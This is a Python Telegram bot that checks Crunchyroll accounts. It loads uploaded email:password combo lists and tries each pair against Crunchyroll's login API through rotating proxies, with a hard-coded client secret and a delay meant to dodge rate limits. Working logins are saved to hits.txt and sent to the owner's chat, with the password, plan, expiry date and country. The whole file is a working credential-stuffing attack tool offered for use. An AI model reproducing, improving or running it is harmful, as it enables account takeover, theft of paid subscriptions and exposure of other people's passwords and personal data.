#!/usr/bin/env python3
import os
import uuid
import random
import threading
import time
import asyncio
from queue import Queue, Empty

import requests
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from telegram.constants import ParseMode

# ================== CONFIG ==================
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER_ID = int(os.getenv("OWNER_ID", 0))   # Your Telegram ID

# ============================================

class CrunchyrollChecker:
    def __init__(self):
        self.countries = {
            "AF": "Afghanistan 🇦🇫", "AL": "Albania 🇦🇱", "DZ": "Algeria 🇩🇿",
            "AR": "Argentina 🇦🇷", "AM": "Armenia 🇦🇲", "AU": "Australia 🇦🇺",
            "AT": "Austria 🇦🇹", "AZ": "Azerbaijan 🇦🇿", "BH": "Bahrain 🇧🇭",
            "BD": "Bangladesh 🇧🇩", "BY": "Belarus 🇧🇾", "BE": "Belgium 🇧🇪",
            "BO": "Bolivia 🇧🇴", "BA": "Bosnia 🇧🇦", "BR": "Brazil 🇧🇷",
            "BG": "Bulgaria 🇧🇬", "KH": "Cambodia 🇰🇭", "CM": "Cameroon 🇨🇲",
            "CA": "Canada 🇨🇦", "CL": "Chile 🇨🇱", "CN": "China 🇨🇳",
            "CO": "Colombia 🇨🇴", "CR": "Costa Rica 🇨🇷", "HR": "Croatia 🇭🇷",
            "CU": "Cuba 🇨🇺", "CY": "Cyprus 🇨🇾", "CZ": "Czech Republic 🇨🇿",
            "DK": "Denmark 🇩🇰", "DO": "Dominican Republic 🇩🇴", "EC": "Ecuador 🇪🇨",
            "EG": "Egypt 🇪🇬", "SV": "El Salvador 🇸🇻", "EE": "Estonia 🇪🇪",
            "ET": "Ethiopia 🇪🇹", "FI": "Finland 🇫🇮", "FR": "France 🇫🇷",
            "DE": "Germany 🇩🇪", "GH": "Ghana 🇬🇭", "GR": "Greece 🇬🇷",
            "GT": "Guatemala 🇬🇹", "HT": "Haiti 🇭🇹", "HN": "Honduras 🇭🇳",
            "HK": "Hong Kong 🇭🇰", "HU": "Hungary 🇭🇺", "IS": "Iceland 🇮🇸",
            "IN": "India 🇮🇳", "ID": "Indonesia 🇮🇩", "IR": "Iran 🇮🇷",
            "IQ": "Iraq 🇮🇶", "IE": "Ireland 🇮🇪", "IL": "Israel 🇮🇱",
            "IT": "Italy 🇮🇹", "JM": "Jamaica 🇯🇲", "JP": "Japan 🇯🇵",
            "JO": "Jordan 🇯🇴", "KZ": "Kazakhstan 🇰🇿", "KE": "Kenya 🇰🇪",
            "KR": "South Korea 🇰🇷", "KW": "Kuwait 🇰🇼", "LV": "Latvia 🇱🇻",
            "LB": "Lebanon 🇱🇧", "LY": "Libya 🇱🇾", "LT": "Lithuania 🇱🇹",
            "LU": "Luxembourg 🇱🇺", "MY": "Malaysia 🇲🇾", "MX": "Mexico 🇲🇽",
            "MA": "Morocco 🇲🇦", "NL": "Netherlands 🇳🇱", "NZ": "New Zealand 🇳🇿",
            "NG": "Nigeria 🇳🇬", "NO": "Norway 🇳🇴", "OM": "Oman 🇴🇲",
            "PK": "Pakistan 🇵🇰", "PA": "Panama 🇵🇦", "PE": "Peru 🇵🇪",
            "PH": "Philippines 🇵🇭", "PL": "Poland 🇵🇱", "PT": "Portugal 🇵🇹",
            "PR": "Puerto Rico 🇵🇷", "QA": "Qatar 🇶🇦", "RO": "Romania 🇷🇴",
            "RU": "Russia 🇷🇺", "SA": "Saudi Arabia 🇸🇦", "RS": "Serbia 🇷🇸",
            "SG": "Singapore 🇸🇬", "SK": "Slovakia 🇸🇰", "SI": "Slovenia 🇸🇮",
            "ZA": "South Africa 🇿🇦", "ES": "Spain 🇪🇸", "LK": "Sri Lanka 🇱🇰",
            "SE": "Sweden 🇸🇪", "CH": "Switzerland 🇨🇭", "TW": "Taiwan 🇹🇼",
            "TH": "Thailand 🇹🇭", "TR": "Turkey 🇹🇷", "UA": "Ukraine 🇺🇦",
            "AE": "United Arab Emirates 🇦🇪", "GB": "United Kingdom 🇬🇧",
            "US": "United States 🇺🇸", "UY": "Uruguay 🇺🇾", "VE": "Venezuela 🇻🇪",
            "VN": "Vietnam 🇻🇳"
        }

    def check(self, email: str, password: str, proxies: list = None):
        device_id = str(uuid.uuid4())
        session = requests.Session()

        if proxies:
            proxy = random.choice(proxies)
            session.proxies.update({'http': f'http://{proxy}', 'https': f'http://{proxy}'})

        # Updated URL + Headers (More Stable - April 2026)
        url = "https://api.crunchyroll.com/auth/v1/token"   # Changed from beta-api

        headers = {
            'User-Agent': 'Crunchyroll/4.0.0 (Android 14; Mobile)',
            'Content-Type': 'application/x-www-form-urlencoded',
            'Accept': 'application/json',
            'Accept-Language': 'en-US,en;q=0.9',
        }

        data = {
            'grant_type': 'password',
            'username': email,
            'password': password,
            'scope': 'offline_access',
            'client_id': 'y2arvjb0h0rgvtizlovy',
            'client_secret': 'JVLvwdIpXvxU-qIBvT1M8oQTr1qlQJX2',
            'device_type': 'android',
            'device_id': device_id,
            'device_name': 'Samsung Galaxy'
        }

        try:
            response = session.post(url, headers=headers, data=data, timeout=20)
            response_text = response.text

            if any(x in response_text.lower() for x in ["invalid_credentials", "force_password_reset", "too_many_requests", "401", "400"]):
                return {'status': 'INVALID', 'email': email}

            if '"access_token"' not in response_text:
                return {'status': 'INVALID', 'email': email}

            token_data = response.json()
            access_token = token_data.get('access_token')

            if not access_token:
                return {'status': 'INVALID', 'email': email}

            # Get Account Info
            headers = {
                'Authorization': f'Bearer {access_token}',
                'User-Agent': 'Crunchyroll/4.0.0 (Android 14; Mobile)',
            }

            me_resp = session.get('https://api.crunchyroll.com/accounts/v1/me', headers=headers, timeout=15)
            account = me_resp.json()

            sub_resp = session.get(f'https://api.crunchyroll.com/subs/v1/subscriptions/{account.get("external_id")}', headers=headers, timeout=15)
            sub_data = sub_resp.json()

            # Determine Status
            plan = sub_data.get('items', [{}])[0].get('product', {}).get('sku', 'Free') if sub_data.get('items') else 'Free'
            expiry = sub_data.get('next_renewal_date', 'N/A').split('T')[0] if sub_data.get('next_renewal_date') else 'N/A'
            country_code = sub_data.get('country_code', 'US')
            country = self.countries.get(country_code, country_code)

            status = "PREMIUM" if plan != "Free" and sub_data.get('is_active') else "FREE"

            return {
                'status': status,
                'email': email,
                'password': password,
                'email_verified': account.get('email_verified', False),
                'account_creation_date': account.get('created', '').split('T')[0],
                'plan': plan,
                'expiry': expiry,
                'country': country,
                'active': sub_data.get('is_active', False)
            }

        except Exception as e:
            return {'status': 'ERROR', 'email': email, 'message': str(e)}


checker = CrunchyrollChecker()


def save_hit(result):
    capture = f"""
{'='*60}
EMAIL: {result['email']}
PASSWORD: {result['password']}
STATUS: {result['status']}
EMAIL VERIFIED: {result.get('email_verified', 'N/A')}
CREATION: {result.get('account_creation_date', 'N/A')}
PLAN: {result.get('plan', 'N/A')}
EXPIRY: {result.get('expiry', 'N/A')}
COUNTRY: {result.get('country', 'N/A')}
CHECKED BY: @Cr_chker001_bot
{'='*60}
"""
    with open("hits.txt", "a", encoding="utf-8") as f:
        f.write(capture)
    return capture


# ===================== TELEGRAM BOT =====================
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text(
        "🎉 <b>Crunchyroll Premium Checker</b>\n\n"
        "Use /check to start\n"
        "Made by @baron_saplar",
        parse_mode=ParseMode.HTML
    )


async def check_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        await update.message.reply_text("❌ Unauthorized!")
        return

    await update.message.reply_text(
        "📤 Send your **combo file** (email:password)\n"
        "Then send proxy file (optional)\n"
        "After both, type /startcheck"
    )
    context.user_data['step'] = 'combo'


async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    file = await update.message.document.get_file()
    filename = f"temp_{update.message.document.file_name}"
    await file.download_to_drive(filename)

    if context.user_data.get('step') == 'combo':
        context.user_data['combo_file'] = filename
        context.user_data['step'] = 'proxy'
        await update.message.reply_text("✅ Combo file saved.\n📤 Now send proxy file or type /startcheck")

    elif context.user_data.get('step') == 'proxy':
        context.user_data['proxy_file'] = filename
        await update.message.reply_text("✅ Proxy file saved.\nType /startcheck to begin checking.")


async def start_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != OWNER_ID:
        return

    combo_file = context.user_data.get('combo_file')
    if not combo_file or not os.path.exists(combo_file):
        await update.message.reply_text("❌ No combo file found!")
        return

    # Load combos
    with open(combo_file, 'r', encoding='utf-8', errors='ignore') as f:
        combos = [line.strip() for line in f if ':' in line.strip()]

    # Load proxies
    proxies = []
    proxy_file = context.user_data.get('proxy_file')
    if proxy_file and os.path.exists(proxy_file):
        with open(proxy_file, 'r', encoding='utf-8', errors='ignore') as f:
            proxies = [line.strip() for line in f if line.strip()]

    await update.message.reply_text(
        f"🚀 Starting Check...\n"
        f"📊 Total: {len(combos)}\n"
        f"🌐 Proxies: {len(proxies) or 'None'}\n"
        f"🧵 Threads: 5 (Optimized)"
    )

    # Run in background thread
    threading.Thread(
        target=run_checker_thread,
        args=(combos, proxies, update.effective_chat.id, context.application.bot),
        daemon=True
    ).start()


def run_checker_thread(combos, proxies, chat_id, bot):
    q = Queue()
    for c in combos:
        q.put(c)

    stats = {'checked': 0, 'premium': 0, 'free': 0, 'invalid': 0}

    def worker():
        while True:
            try:
                combo = q.get(timeout=5)
            except Empty:
                break

            try:
                email, password = combo.split(':', 1)
                result = checker.check(email, password, proxies)

                stats['checked'] += 1

                if result['status'] == 'PREMIUM':
                    stats['premium'] += 1
                    capture = save_hit(result)
                    asyncio.run(bot.send_message(
                        chat_id=chat_id,
                        text=f"<b>🎯 PREMIUM HIT</b>\n<pre>{capture}</pre>",
                        parse_mode=ParseMode.HTML
                    ))

                elif result['status'] == 'FREE':
                    stats['free'] += 1
                    asyncio.run(bot.send_message(chat_id=chat_id, text=f"FREE → {email}"))
                else:
                    stats['invalid'] += 1
                    # Optional: send invalid (comment if too many)
                    # asyncio.run(bot.send_message(chat_id=chat_id, text=f"❌ INVALID → {email}"))

            except:
                stats['invalid'] += 1
            finally:
                q.task_done()
                time.sleep(1.5)   # ← Anti Rate Limit Delay (Very Important)

    # Start workers (Low threads to prevent conflict)
    for _ in range(5):   # Max 5 threads
        t = threading.Thread(target=worker, daemon=True)
        t.start()

    q.join()

    asyncio.run(bot.send_message(
        chat_id=chat_id,
        text=f"✅ <b>CHECK FINISHED!</b>\n\n"
             f"Checked: {stats['checked']}\n"
             f"Premium: {stats['premium']}\n"
             f"Free: {stats['free']}\n"
             f"Invalid: {stats['invalid']}",
        parse_mode=ParseMode.HTML
    ))


def main():
    if not BOT_TOKEN or OWNER_ID == 0:
        print("❌ Set BOT_TOKEN and OWNER_ID in Railway Variables!")
        return

    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("check", check_cmd))
    app.add_handler(CommandHandler("startcheck", start_check))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_file))

    print("🤖 Crunchyroll Checker Bot Started Successfully!")
    app.run_polling()


if __name__ == "__main__":
    main()
